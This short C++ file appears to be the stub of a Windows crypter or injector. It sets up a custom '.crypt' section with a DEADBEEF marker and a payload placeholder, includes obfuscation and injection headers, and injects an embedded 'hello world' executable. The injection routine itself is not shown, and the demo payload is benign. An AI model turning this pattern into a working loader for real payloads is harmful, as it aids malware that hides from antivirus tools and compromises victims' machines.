#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>

#include "../includes/Obfuscate.h"
#include "../includes/startInjection.h"
#include "../includes/HelloWorldHex.h" // Include the embedded helloWorldPayload array

#pragma section(".crypt", read, write)

unsigned char marker[] __attribute__((section(".crypt"))) = { 0xDE, 0xAD, 0xBE, 0xEF };
unsigned char payloadData[] __attribute__((section(".crypt"))) = { 0x00 };
unsigned int payloadData_len __attribute__((section(".crypt"))) = sizeof(payloadData);

using namespace std;


int main() {

    // Continue with injection
    startInjection(hello_world_exe, hello_world_exe_len);
    return 0;
}
